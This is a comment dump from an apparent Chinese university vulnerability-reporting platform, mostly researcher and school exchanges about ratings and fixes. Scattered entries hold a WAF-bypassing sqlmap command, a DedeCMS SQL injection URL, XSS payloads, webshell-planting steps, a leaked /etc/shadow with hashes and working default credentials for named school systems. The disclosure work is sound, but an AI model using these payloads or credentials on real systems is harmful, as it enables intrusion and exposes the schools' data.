11911,1125,你好，sqlmap验证时带上参数，因为有waf，带上参数无视waf，如图。
11946,1502,刚看了一下，网站恢复了，万幸！<br />其实是我操作失误了，type=WriteVisit是直接进行写了，如果要进行读，应该改为type=ReaderVisit，<br />所以其实这里还有一个任意文件读取漏洞，下面是读取此站读取web.config后的截图，可以读到数据库密码。<br />https://src.edu-info.edu.cn/media/images/2017/05/19/652981e9-f7d2-4dff-932c-6f8c9c561b42-BtLmTb52.JPG
12035,993,嗨呀，百度一搜一大把，审核师傅要带我飞吗 ^_^
12066,1502,sqlmap验证命令:sqlmap.py -r t.txt -p TypeId --dbms=mssql --tamper=space2mssqlblank.py --string=&quot;服务&quot; --dbs
12075,992,...
12127,143,已经修复弱口令
12177,1621,您好，这账号是从教务处官网公示得到的，然后爆破的
12179,2394,这是我写进去的webshell，为啥叫无法确定
12210,1096,乌云的文章。。。不好意思。。。脑子瓦特了。。。
12231,143,经过与我校相关部门沟通，未发现此网站归属我校。
12247,1571,傻逼了吧，懵逼了吧，没办法，因为你是s2-045
12247,1522,傻逼了吧，懵逼了吧，没办法，因为你是s2-045
12247,1328,你是一条虫把 还危害特别大
12310,992,域名/IP 获取的IP地址 数字地址 IP的物理位置<br /><br />202.115.82.133 202.115.82.133 3396555397 四川省成都市 成都大学
12352,2216,审核小姐姐，小哥哥求通过想换证书
12370,1470,已修复。
12379,2216,审核辛苦了😄
12387,822,黑客，收徒吗？
12387,2216,/(ㄒoㄒ)/~~，，，我技术没你好吧。。。。。。
12387,2216,这个是被国外黑客黑的，我只是报告了这个地方被黑。。。。
12404,189,谢谢告知，已经处理
12405,189,谢谢告知
12440,484,谢谢，已经转交相关单位
12485,2458,非常感谢，已联系业务部门并通知软件开发公司落实、处理。
12529,2416,危害等级忘了改了，管理员改个中危可好，谢谢^_^
12540,992,域名/IP 获取的IP地址 数字地址 IP的物理位置<br /><br />202.115.138.215 202.115.138.215 3396569815 四川省成都市 成都理工大学
12566,1960,已处理。该系统属于工信委无线电管理委员会的应用系统，映射到教育系统，用于考场监控
12586,1426,&lt;form&gt;
12586,1426,&lt;script&gt;
12586,1426,alert(&#39;xss&#39;)
12643,542,有没有发现者白帽子stolzer的联系方式，我想请他帮忙看一下，现在是否整改好了，不知道效果如何
12678,555,应该是系统bug，已经通知相关单位处理
12690,2430,在测试漏洞时，我已经征得了对方的同意
12690,2430,在测试漏洞时，我已经征得了对方的同意
12690,48,黄同学 研究生吧？ 留个联系方式，来交流下。同校
12690,2430,你是那个本科打ctf的群主([捂脸]我是刚学安全的老人家了)么？不好意思啊，现在才看到
12710,2422,忘了选择危险等级 = =
12795,484,谢谢，已经转交相关单位
12850,1267,忘记给这个了：<br />root:$6$v4hGQKGv$/cFKL9HBAnicMX/UYfrtO7cuVst9DCXPtYCLnQmFoSmXzF751OFF05ni9Fj615lPZoga/wvtwcrqk/nKISWGM/:16934:0:99999:7:::<br />bin:*:15980:0:99999:7:::<br />daemon:*:15980:0:99999:7:::<br />adm:*:15980:0:99999:7:::<br />lp:*:15980:0:99999:7:::<br />sync:*:15980:0:99999:7:::<br />shutdown:*:15980:0:99999:7:::<br />halt:*:15980:0:99999:7:::<br />mail:*:15980:0:99999:7:::<br />uucp:*:15980:0:99999:7:::<br />operator:*:15980:0:99999:7:::<br />games:*:15980:0:99999:7:::<br />gopher:*:15980:0:99999:7:::<br />ftp:*:15980:0:99999:7:::<br />nobody:*:15980:0:99999:7:::<br />dbus:!!:16933::::::<br />vcsa:!!:16933::::::<br />rpc:!!:16933:0:99999:7:::<br />abrt:!!:16933::::::<br />rpcuser:!!:16933::::::<br />nfsnobody:!!:16933::::::<br />haldaemon:!!:16933::::::<br />ntp:!!:16933::::::<br />saslauth:!!:16933::::::<br />postfix:!!:16933::::::<br />sshd:!!:16933::::::<br />tcpdump:!!:16933::::::<br />oprofile:!!:16933::::::<br />mysql:!!:16933::::::<br />nash:$6$tguWxyy1$PDYhLEjZpwF1QDXIFZbiR44TATWXYi/eLFbEHfiygsRj1T3HUdnk1p8y80levJNzo6mZKiC49ABTHTy6eoBL2.:16934:0:99999:7:::
12861,1297,漏洞已修复，目前登录后台管理界面需要输入账号密码，且后台账号密码具有时效性；上传图片已修改权限，禁止执行。谢谢！
12922,2014,http://61.180.31.36/yst/admin/Admin_login.asp  POC打错了打错了… 是这个TAT
12928,2014,from yhb where yhm=&#39;jw 这里末尾少了一个c
12934,2430,写错了，呜呜，应该是广东省经济贸易职业技术学校。审核大大刀下留人啊呜呜
12977,1571,一个爆破说得这么。。。
12977,2418,这个可以有吗？
13086,1011,江苏理工    错了  失误失误  审核别生气
13094,2216,本来要给你4rank，你求了一个3rank
13094,2416,不是吧~~囧
13107,992,域名/IP 获取的IP地址 数字地址 IP的物理位置<br /><br />202.115.22.73 202.115.22.73 3396539977 四川省成都市 电子科技大学
13108,2422,T T 第二次忘了改等级，尴了个尬。。。
13146,2621,555-555-0199@example.com
13148,2431,数据库那张图传错了 ~~
13166,992,域名/IP 获取的IP地址 数字地址 IP的物理位置<br /><br />202.199.162.145 202.199.162.145 3402080913 辽宁省大连市 东北财经大学
13184,1096,暴露出敏感信息&lt;system.web&gt;账号密码，数据库账号密码和database。如上图所示。
13188,484,谢谢，已经转交相关部门
13191,2480,没人审核
13221,992,域名/IP 获取的IP地址 数字地址 IP的物理位置<br /><br />202.118.223.232 202.118.223.232 3396788200 黑龙江省哈尔滨市 哈尔滨工业大学
13284,2122,已联系厂家整改，谢谢！
13291,484,谢谢，已经提交相关单位
13399,790,还漏了一个 http://wy.***.edu.cn
13425,415,厂家确认存在问题，已经修复
13512,1764,已整改。
13524,992,尴尬，标题错别字，帮忙改下_(:з」∠)_
13619,1470,已修改。
13646,1426,审核大大最帅～
13649,40,修改厂商为清华大学 （逃
13659,474,已经收到报告，感谢白帽子的提醒
13691,484,谢谢，已经讲相关信息转交相关单位
13711,2440,那个危害级别弄错了，应该是中危的
13935,1096,补充：此处还存在弱口令（账号test密码test）（账号apache密码apache）。拥有的权限也很大。
13942,2469,cms自带后门
13979,1426,恩 不属于高校的话 我就提交补天啦～ 审核大大最帅～
14051,2538,不是id参数  是Subject_21参数 谢谢
14063,1470,已修复，谢谢。
14080,2469,这是刷的通用么？分好低。
14080,1146,呵呵，问题比较简单，可以了。
14145,2538,嗯嗯
14192,1146,没有仔细看，我错了。
14193,1146,没有仔细看，我错了。
14219,83,已通知该系统使用单位
14275,2419,666
14275,1426,我草 为毛我的命令执行才给俩rank 没有getshell的原因？
14275,2538,6666666
14319,484,谢谢，已经转交相关单位处理
14403,1571,网站的title证明 我觉得就可以了 、、、、、、、、
14410,1570,Access的数据库，我不怎么会绕，但是这个绝对可以利用
14428,630,已修复
14462,2434,审核大人 我也想啊 但是俺是个菜b 不会呢
14468,2416,追加：另外一个同样性质的系统也是有未授权的。
14484,1764,已更改密码
14523,2378,我想问为什么驳回我7个rank，给我5个，驳回7个。。。
14528,1096,抱歉，漏洞详情里面所写的学校忘改了，漏洞链接还是这个学校（安徽信息工程学院）的。希望不要给驳回重交了。谢谢。
14530,1073,谢谢提醒，我们立刻要求相关责任人进行改正。
14633,484,谢谢，已经转先关单位处理！
14649,2538,审核大大应该知道密码吧
14649,2538,知道了
14729,500,非常感谢。
14738,1759,已提交我校图书馆信息部门处理。
14745,1073,谢谢！我们会立刻改正。
14780,2419,不是，我好像没明白,admin的原密码，假设不知道也可以更改呀？！会弹出一个原始密码不正确，但是，还会执行更改密码的操作呀！
14797,306,马上处理
14798,306,马上处理
14856,415,已经通知厂家修复，非常感谢
14865,306,昨天已联系相关单位抓紧处理
14920,55,很巧妙的社工，谢谢。已开启数据防护，相关系统已整改。
14956,2216,他网站就具备你所说得条件和偶然性啊，getshell都是低微，，，，，
14986,2216,就是这么写的，就是这么配置的
15042,2600,之前不清楚注入需要截图,没截图都补上了。
15043,2600,提交过了没截图没过,重新提交下。
15044,2600,提交过了没截图怕不会过就截图了
15099,1011,山西财经。。。。
15115,2600,以上操作只为了证明能getshell。本是测试完成自己删除一句话的，服务器的安全防护检查出了铭感操作,已访问不了,如能正常访问了请麻烦自行删除xiaobai.php的一句话谢谢！！！
15123,2272,职业学院不行？
15151,2600,过🐶加分吗 - -
15172,2538,审核没睡吗？
15176,1078,已处理
15200,447,才上的业务系统，部署调试阶段就被你们发现了
15235,2216,截图放错了，是跑得出管理员信息的。。。。。。。。。。。。。。。。。
15251,3482,非常感谢口令已修改！
15365,2216,你可以把参数向后推一点啊07-11年的
15377,1426,这网安法都出几个月了，还敢getshell?
15377,1426,最好点到为止。
15393,306,马上处理
15394,306,马上处理
15400,1426,这个标题有点尴尬啊～哈哈......
15400,6414,这个标题牛皮
15403,2272,首先在添加管理员处，添加管理员，姓名为一句话：http://i2.bvimg.com/1949/1487bd16c6efabf9.png<br /><br />数据库备份即可拿到webshell：http://i2.bvimg.com/1949/c0e438bbdbcfe9f3.png
15425,822,又开始刷了。。。
15425,993,没啊。。。
15475,56,收到漏洞信息，尽快通知相关单位删除涉及表格。
15507,2624,使用cookie注入方法进行注入
15629,2600,之前那个地址没写重新补了
15651,2600,写错了是中北
15768,993,表哥威武，求ssrf遍历姿势
15768,993,姿势get了，表哥 求交流。。
15768,2632,额，现在才看到
15768,993,表哥QQ多少呀，一起交流学习^_^
15791,2630,= = 。 招生章程只是显示下是这个学院的而已  。。 弱口令我如果找的到后台再提
15898,2636,开头漏了一句，该地址本应从http://xyh.jluzh.com/admin/登录过后才能访问
15928,2628,亲爱的审核大人，第三张图片我上传错了，请谅解
15976,1426,审核大大帮忙改下标题：四川文理学院某系统逻辑漏洞
15984,2216,用户名：admin 密码：admin888
16036,2621,没重复，两个不一样，你自己看
16036,2621,一样的我把头砍下来
16073,1096,忘写一个漏洞，存储型XSS在修改个人资料处，账号--》修改头像--》基本信息，这里输入身份证号，然后个人签名输入：&quot;&gt;&lt;script&gt;alert(&quot;a&quot;)&lt;/script&gt;&lt;&quot;，这样提交即可。说明：所属机构给注释掉了，用火狐的插件firebug修改参数disabled删除掉即可。
16100,1426,不怼厂商不给高危啊.....
16122,399,感谢提交漏洞，已做升级
16128,1096,尴尬，这个详细内容里面的学校忘改了，不过内容是没错误的，抱歉，谅解。
16246,484,谢谢，已经转相关单位！
16267,2600,好的
16378,1426,我擦... 审核复现不了？？什么鬼
16405,2621,555-555-0199@example.com
16406,2621,555-555-0199@example.com
16408,2634,小标题写错了两个字，是武汉科技大学
16430,233,软件厂家反馈已经修复。
16446,189,已经修复，谢谢告知
16459,2621,谢谢。
16459,4578,感谢，该漏洞原因是由于系统安装后未修改系统默认密码造成，现已修复。
16492,2621,真他*的惊喜的不行
16503,1297,目前已限制该网站对外服务，要求单位整改，谢谢！
16626,1571,错了 是201116110402.aspx
16646,2024,好的，多传几个图就好了
16706,6661,tql
16724,2440,*没有
16750,2653,漏洞报告中的漏洞URL出现错误，应为：http://gxfdyxk.ahnu.edu.cn/Login.aspx?Role=manage
16750,1135,请不要在评论提交敏感信息
16787,343,已修复，谢谢
16802,4550,QWQ 大佬求带SQL注入点发现姿势
16802,993,瞎刷。。拿着扫描器扫
16996,306,收到，已经处理
17034,1847,已经处理
17049,2653,已跑出注入，如何上传注入图片？
17054,1759,已通知到南国商学院整改。
17064,1096,注：由于这里的编译器过滤了星号（*），所以把我构造的payload过滤了，在链接里面参数ccolumns等于*，即（&amp;ccolumns=*&amp;）,这样就可以显示结果了。
17070,1096,注：由于这里的编译器过滤了星号（*），所以把我构造的payload过滤了，在链接里面参数ccolumns等于*，即（&amp;ccolumns=*&amp;）,这样就可以显示结果了。
17075,1096,注：由于这里的编译器过滤了星号（*），所以把我构造的payload过滤了，在链接里面参数ccolumns等于*，即（&amp;ccolumns=*&amp;）,这样就可以显示结果了。
17075,99,收到 非常感谢详细的介绍。
17076,1096,注：由于这里的编译器过滤了星号（*），所以把我构造的payload过滤了，在链接里面参数ccolumns等于*，即（&amp;ccolumns=*&amp;）,这样就可以显示结果了。
17176,2635,URL=http://jwc.syphu.edu.cn/ACTIONDOWNLOADFILES.APPPROCESS?FileID=10867&amp;FileName=/本科检查性听课统
17238,2014,帐号格式:201X100XXX
17285,1967,已处理完毕！
17338,2628,标题麻烦亲爱的审核大大帮忙改成西北师范大学敏感信息泄露
17350,5027,关停处理
17398,1297,目前已限制该网站对外服务，谢谢！
17402,1297,目前已限制该网站对外服务，谢谢！
17403,1297,目前已限制该网站对外服务，要求单位整改，谢谢！
17404,1146,之前给学校提过，只是弱口令太弱太多，一时激愤，忘记刹车了，感谢指正，保证下不为例。
17529,4550,啊=大手子带带我
17534,1925,我们正在努力修复，谢谢你。
17536,4548,注入点不是第一行就写出来了么。。。<br />注入点：huiwenhua.ahu.edu.cn/single.php?act=contact
17608,2480,标题没法修改了
17630,2635,@审核   江苏广播电视大学
17838,2392,已进行隔离处理。
17841,5182,已经修复，并已经安全加固。
17843,2857,谢谢提醒
17873,2600,忘了说了该系统是有奕迅waf的没有拦截,策略有问题吧。
17922,2612,这是什么漏洞，我靠
17922,2601,这是跑过去开万能钥匙蹭wifi然后顺便提交个漏洞吗、、
17952,5182,该网站由职能部门自行建设、管理，已经要求职能部门先关停网站。
17952,5182,已经关停该网站。
17972,2431,弱口令不重复
17977,1542,robots.txt
17982,2244,这是什么操作这也给分？
18011,1764,已经修复。
18047,2272,注入点不一样   ok？
18057,59,已收到
18080,4355,最后一个忘了补全利用地址了~
18104,2597,还有一个地址：http://222.22.73.10:8080/Default?MAIN=DEVICE<br />账号密码同上
18211,162,已关闭该网站，网站单位已开始制作新网站
18254,289,感谢发现漏洞并提交，已修改弱口令，谢谢。
18276,2068,已修复
18451,1146,审核，你好！实在不好意思，最后的链接地址少了一个classes/
18478,4021,忘记选危险程度了 我重新提交下
18565,53,第三个不是山东师范大学的
18599,484,收到，已经转相关单位处理，谢谢！
18704,73,该系统托管在南京理工大学，已要求管理方关闭有漏洞的平台。
18739,500,116.62.168.88这个IP地址不属于辽宁石油化工大学。
18776,1898,谢谢
18807,5342,DBA权限的sql注入才分的呀…,还有那么多学生账号密码…
18823,297,弱口令，已修改
18827,4523,测试中，还未启用……
18842,306,thanks a lot !
18864,5331,admin/123123. 后面有个点啊，怎么不可用
18870,5353,尚未完全修复，http://ietc.hncc.edu.cn/s/46/t/166/47/93/info18323.htm此页面仍可以正常访问！大约280名学生信息还暴露在公网上
18971,4021,忘记选危害程度，麻烦按危害程度给分 ，帮我修改下。。
18981,289,15年的历史信息，可以与时俱进进行身份证号码的掩盖或对内容进行删除，炒冷饭的行为被冠以系统漏洞的名义并被审核通过，是否合适？
18981,986,平台并非只收系统漏洞，漏洞与威胁情报都会对学校进行通报，因为这都是存在安全威胁和隐患的。
18996,2431,给2分是咋回事,能写一句话木马不严重吗
19007,306,收到 马上处理！
19054,5342,后台登陆url为：http://jsj.qhnu.edu.cn:8086/admin/login.html
19060,484,谢谢，已经提交相关单位处理！
19078,2024,管理你好 需要添加脚本才能跑出来，提交的时候忘了说 了
19124,59,非本单位ip地址。
19265,1080,谢谢提醒！已经通知老师立即修改密码。
19301,5381,谢谢，已修复。
19363,2644,可以获取服务器很多敏感文件，比如还可以获取 /root/.bash_history，ssh key文件
19404,3450,我校对作者所提交的漏洞已进行了认真修补，感谢您对我校网络信息安全的关注。<br /><br />希望您能继续支持我校网络信息安全的工作！
19476,5394,临时文件upload开头的那些是邮件上传的附件，最后那张图片里的临时文件是邮件。为什么提交后不能修改呢？
19490,500,Thanks!!
19609,1426,下载的敏感信息以格式化～
19652,2244,你的名字和你的漏洞一样的诚实！！！老实人。
19698,272,收悉，已经处理了，谢谢！
19743,4021,忘记提交url重提
19748,306,收到 马上处理！
19850,484,谢谢，已经转相关单位处理！
19920,5342,不好意思,附件忘记上传了.复现需要手工抓包保存txt文件了。
19938,1297,已通知单位整改，暂限内网。
19976,289,感谢提交漏洞，该网站为我校新闻网老网站，已修复漏洞，再次感谢！！
20110,1297,已通知单位整改，暂限内网。
20133,1958,http://zddr.gdsmy.com:8000/recruit/signup/login.aspx
20135,2601,存在漏洞我怕猝死，所以只挖了一半<br /><br />那哥替你去看看
20135,2024,禽兽啊、给我留着，满血复活了。
20149,1069,把漏洞详情，告之了公司，正在处理。
20317,2601,sadsa
20356,28,这是开源软件镜像
20359,2679,已修改，而且里面的ip，密码都是测试时用的。非正式环境，都无法连接。
20543,2431,不小心重复提交
20583,1173,感谢提交，已通知网站已关停，等修复并验证无漏洞后重新开放。
20593,4872,此漏洞属于中国地质大学（武汉），谢谢！
20619,484,收到，谢谢！已经转相关单位处理！
20650,5342,忘说了，弱口令账号密码为：zhaoban/zhaoban
20657,1718,已通知招生就业处，今天内处理。
20978,3448,感谢提供，很有用
21008,1267,如果网站显示500请切换云南代理
21136,40,应该是代理的 http://www.smvtc.com/ 官网<br />http://www.smvtc.com/eWebEditor/UploadFile/20151029112941240.xls 对应的文件官网也有一份
21159,3064,访问时显示error!是不是产品漏洞已经修补
21181,1691,非本校地址，已联系对方单位删除
21414,4653,忘记贴修复建议了：附上<br />修复建议：建议及时更新struts2的版本到最新或打上相关漏洞补丁。<br /><br />如果暂时不方便更新及打补丁，建议使用以下临时解决办法：S2-045<br /><br />删除commons-fileupload-x.x.x.jar文件。请注意删除该文件可能导致网站的上传功能或其他应用无法正常使用。<br /><br />S2-046<br /><br />添加过滤器，将攻击行为的请求在进入struts2的StrutsPrepareAndExecuteFilter拦截器之前捕获。过滤器中，获取Content-Length以及Content-Type的值，将正常请求放过。<br /><br />放过的条件为：<br /><br />1.请求内容不超过2M；<br /><br />2.Content-type值为正常值，不受S2-045漏洞影响。<br /><br />然后对请求内容进行判断，获取上传文件名，判断请求中是否包含S2-046漏洞的利用相关条件：<br /><br />1.请求长度是否超出2G；<br /><br />2.filename中是否包含S2-046漏洞的利用字符。
21482,3742,处理方案: 问题网站已下线整改
21527,4783,已整改
21569,5367,第二个子站问题更严重
21625,2726,已经修复
21643,5276,该网站已经删除
21745,4103,已经处理，谢谢！
21773,1073,谢谢！
21965,589,已修复该漏洞
22000,4982,已经整改。
22003,4004,感谢，已关闭站点整改。
22046,5366,登录用户那边需要点击部门那个选项才能登录
22098,2431,源码泄露地址http://www.wlxt.uestc.edu.cn/wlxt/ncourse/dip2/web/web7.0.zip
22108,1680,什么系统，如何下载信息
22108,5483,标题为温州大学，单位确实温州商学院。
22119,1297,属于公开信息，不算敏感信息泄露。另外，正在尝试联系对方处理。
22119,1297,教师信息泄露已处理，数据已删除。
22169,5455,不好意思，忘了给弱口令了：123456
22178,2431,ip对应的域名是这个<br />http://ic.wczy.cn:8020/admin/adminllogin.asp
22238,5455,源码泄露中就有mysql账号密码
22238,5455,麻烦改哈标题为 中国地质大学漏洞 谢谢
22241,233,感谢，已修复。
22257,4705,十分感谢
22315,4420,正常压缩包，已转移，已删除
22315,4420,请设为管理员
22328,5497,对没错，换三件衣服就跑路！
22334,2468,已处理，谢谢提醒！
22352,5519,这个ip平时是可以外网访问的，只不过最近这个ip段在维护。。。
22358,1426,......
22358,1426,审核大大还没睡觉啊～
22358,10,睡了睡了，明天再审
22358,1426,嗯啊～晚安啦多注意身体啊～
22363,1426,sqlmap盲注跑的有点慢～
22402,109,感谢提供，我们尽快处理该问题。
22409,1426,审核大大可以访问7002端口就可以看出来该系统属于河南中医药大学的啦～
22418,5492,哈哈，早知道只算第一个就不辛辛苦苦截图啦～
22421,5509,给大佬打Call
22426,1637,@不郑，你好，我是华师的运维人员，可否加下QQ：903282508 ，关于该漏洞，验证中有些问题向你请教
22450,1080,谢谢，已经要求立即整改，我们会严密监控。
22461,28,这不是漏洞，pxe系统文件，本来看就是开放的小系统，也没有敏感信息
22468,1020,高危4rank？
22469,5524,我擦 为什么注入才4rank
22474,5365,/*!00000这个注释方式过滤牛逼！
22494,2431,忘记说明了,那个账号密码编辑框,有长度限制,审查元素修改账号密码编辑框的maxlength这个值为100N及maxlength=&quot;100&quot;就能输入了完整了
22496,484,谢谢，已经提交相关单位处置
22497,484,谢谢，已经转交相关单位处置
22497,5492,真的好感动，居然说谢谢。。。我校老师只有一句话：小心把你送公安局去，唉。。。
22497,1426,我擦，贵学校老师没毛病......
22497,1426,你是提交到src了还是给你们学校老师发送的邮件啊～
22499,5492,喔，抱歉，刚看到这个公告说 “同一单位多处同类型漏洞，请打包提交，方便校方进行对接和统一处理。”<br />额，同一学校多个网站算同一单位吗，算的话管理审一个就好啦～
22526,1426,抱歉啊审核大大漏洞提交错厂商了，帮忙更改一下：华中农业大学某处未授权访问漏洞
22534,1426,评级写错了....
22534,1426,审核大大看着给分吧～
22550,59,非南京大学IP
22556,1426,dba权限才给两分嘛？
22556,1426,？
22556,1426,难道说只有通过sql注入脱取敏感数据继续getshell才给高分嘛？
22556,1426,难道说只有通过弱口令后台上传木马getshell才给高分嘛？
22556,10,通常sql注入不会低于4分，除非是多个站点的相同注入点（比如这次是多个站点使用了相同的后台管理软件的同一个漏洞）。如果继续深入拿到shell或是能够证明库中含有敏感数据，分数会提高。此外，给分不仅根据漏洞的类型和影响，还会看漏洞的详细程度，包括漏洞发现过程（如发送怎样的请求发现了响应的异样之类的）、利用的方法（如是否存在过滤等利用的限制）、利用后的结果（如敏感数据或运维相关权限）等等，甚至查阅的相关资料都可以写进去。其实并非不能使用工具，工具可以大幅提升效率，但更希望你们能够发现原创漏洞，因为这些漏洞是扫描器扫不出来的，需要花费更多的时间和精力去钻研。当然，这也是我这个新进审核的个人见解，不妥之处还请多包涵。
22556,1426,审核大大您好，如果我已经能够证明sql注入拥有很高的权限，有getshell的可能性，就完全可以点到为止了，没必要再去脱数据库的敏感信息，如果只是为了证明危害还继续去往服务器上写木马，如果被网站管理发现异常报警怎么办？src平台能保证我们白帽子的安全嘛？您认为合理嘛？白帽子做测试难道没有脱数据？白帽子做测试难道没有上传木马？我都已经拥有dba权限了，难道白帽子都为了高rank都还要去dump数据？
22556,1426,dba权限的sql注入给这种评分我是接受不了的。
22556,10,有getshell的可能性不代表一定能getshell，dba权限也不是一定可以成功写shell，能够注入不代表库里一定有敏感数据（并不需要脱取整个库，只要截图打码说明即可）。根据https://src.edu-info.edu.cn/introduction/，可以获取主机权限或上传可解析、可执行文件，只要在截图证明后删除即可。至于这里rank降低的原因是通用型漏洞，上面已经说过了。
22558,88,已经联系网站管理员修改密码
22574,10,我这里还是无法访问，端口被过滤了<br />C:\Users\caozc2013&gt;nmap -Pn sxy.gxun.edu.cn -p80<br /><br />Starting Nmap 6.47 ( http://nmap.org ) at 2018-08-19 00:25 中国标准时间<br />Nmap scan report for sxy.gxun.edu.cn (210.36.64.59)<br />Host is up.<br />PORT   STATE    SERVICE<br />80/tcp filtered http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 36.73 seconds<br /><br />C:\Users\caozc2013&gt;nmap -Pn epay.gxun.edu.cn -p80<br /><br />Starting Nmap 6.47 ( http://nmap.org ) at 2018-08-19 00:27 中国标准时间<br />Nmap scan report for epay.gxun.edu.cn (210.36.64.27)<br />Host is up.<br />PORT   STATE    SERVICE<br />80/tcp filtered http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 39.04 seconds
22574,10,ping也不通，是不是有防火墙？附上一个检测连接http://ping.chinaz.com
22574,5498,要不你试试换台设备访问，我这里nmap输出信息是这样的<br />C:\Users\Master&gt;nmap -Pn epay.gxun.edu.cn -p80<br /><br />Starting Nmap 7.40 ( https://nmap.org ) at 2018-08-19 07:47 ?D1ú±ê×?ê±??<br />Nmap scan report for epay.gxun.edu.cn (210.36.64.27)<br />Host is up (0.031s latency).<br />Other addresses for epay.gxun.edu.cn (not scanned):<br />PORT   STATE SERVICE<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 24.68 seconds<br />不行的话我就放弃这个漏洞吧。
22581,5498,写错了，密码应该是admin88888
22589,1426,补充一个域名：kyc.hnuc.edu.cn/upload/
22592,1426,用户密码输错3次以上～
22592,1426,有管理员的账号，并且还有大量用户的弱口令啊
22595,1426,困啊～
22595,1426,审核大大还审核洞嘛～不审核我睡觉去啦～
22595,1426,～～
22595,10,睡觉去吧，我也想明天再审-_-
22595,1426,嗯啊 那明天继续交洞啦～ 审核大大晚安啦～
22599,1426,审核大大～起床审洞啦～
22623,1426,审核大大，我想问一下上海交通大学的原创漏洞证书有没有pdf电子版，纸质版的有没有相框，还是说只是一张证书......
22623,10,我也不太清楚，可以在群里问一下管理员
22628,88,已经联系管理员处理。
22646,2728,test1、test2均为系统安装调试时的测试账号，现已删除，谢谢
22655,1426,这个漏洞搞apt攻击是真的强......
22688,1426,审核大大虽然域名不是edu.cn但数据的确是该厂商的。域名是从他们学校官网跳转的。
22688,1426,我也反复确认的好几遍
22688,1426,这个窗口我关闭了，title信息就是该厂商的漏洞啊～
22688,1426,这个title信息已经很明确了啊......
22692,1426,审核大大，像ms15-034这种漏洞src平台接受嘛......
22709,1426,审核大大帮忙改下标题：牡丹江大学某处漏洞
22709,1426,审核大大帮忙改下标题：牡丹江大学某处漏洞，强迫症看着很难受......
22762,5498,搞错了，最后一个密码是admin123
22762,5498,要重新提交吗？
22764,88,已经联系管理员修改
22779,474,感谢提醒。。
22797,484,谢谢，已经转交相关单位处理
22799,484,已经转相关单位处理，谢谢
22809,1426,漏洞url贴错啦，审核大大在post请求体里自己找啦～
22813,484,已经转相关单位处理，谢谢
22846,1426,超级管理员才给低危&gt;_&gt;
22860,1426,存在用户枚举,以下用户：<br />lihui<br />lin<br />wangrui<br />wangpeng	<br />wangwei<br />ww<br />zhangyu<br />zyl<br />admin<br />zy<br />zxl<br />zr<br />ADMIN<br />11<br />1<br />Administrator<br />DS<br />lin<br />michael<br />wang
22867,1297,已通知单位整改，暂限内网。
22871,484,谢谢，已经转交相关单位处置
22906,1426,超级管理员权限
22922,1297,已通知单位整改，暂限内网。
22936,78,此为单独定制的手机版网站，只有厂家技术可以处理，昨天已反馈给厂家技术处理。
22947,1426,666
22947,1426,超级管理员权限～
22949,1426,打听一下，交换机地址泄露给分么？，
22949,10,仅地址泄露不给
22955,1426,审核大大还没睡觉啊～
22955,1426,= =怎么现在也变成夜猫子了......
22963,1426,补上一个用户：<br />帐号：teacher<br />密码：123456
22983,3154,已经修改
22989,1426,666
22989,5543,大佬低调了
22998,5543,最后忘了补数据包了。可以自己抓一个，账号问题啥的可以在Q上说，加群了，麻烦同意一下。
23055,1426,= =title写错了......
23090,1426,这个抱歉，测试只点到为止，不上传木马，不getshell
23090,3154,谢谢
23096,1426,管理员权限
23115,5416,并未修复，依然存在！！！！！
23132,1426,= =
23142,1426,皮一下很开心～
23143,5543,还没审核吗？
23144,5409,为什么只有 2 rank
23168,1426,漏洞评级写错了......
23181,5365,明白了,OK！
23185,5549,漏洞已修复！
23201,5365,审核大大，为什么不能显示*号，这个问题要程序员解决下啊，不能在漏洞细节里发星*号，会不见，细节如下<br />/plus/recommend.php?aid=1&amp;_FILES[type][name]&amp;_FILES[type][size]&amp;_FILES[type][type]&amp;_FILES[type][tmp_name]=aa\%27AnD+ChAr(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,user(),5,6,7,8,9%20FrOm%20`%23@__admin`%23
23201,10,应该是md里 *是特殊符号，要发代码或含有特殊符号的url可以在前后加`  `
23300,3241,已关停该网站并联系网站责任管理部门进行网站安全整改。
23343,5498,emmmm忘记写ip归属地了，麻烦审核大大了
23355,580,已修复。lzf，2018-10-04 11:11:00
23365,56,已处理
23387,5554,数据为AD域账户，可能会涉及内网安全。
23464,2144,接到通报后，广州大学工作人员立即排查，发现该网站是广州大学华软学院的网站，它是挂广州大学名的独立二级学院，该学院是独立招生，网站和信息系统也是独立运作，不归属广州大学管理。该信息漏洞通告应该发给广州大学华软学院。
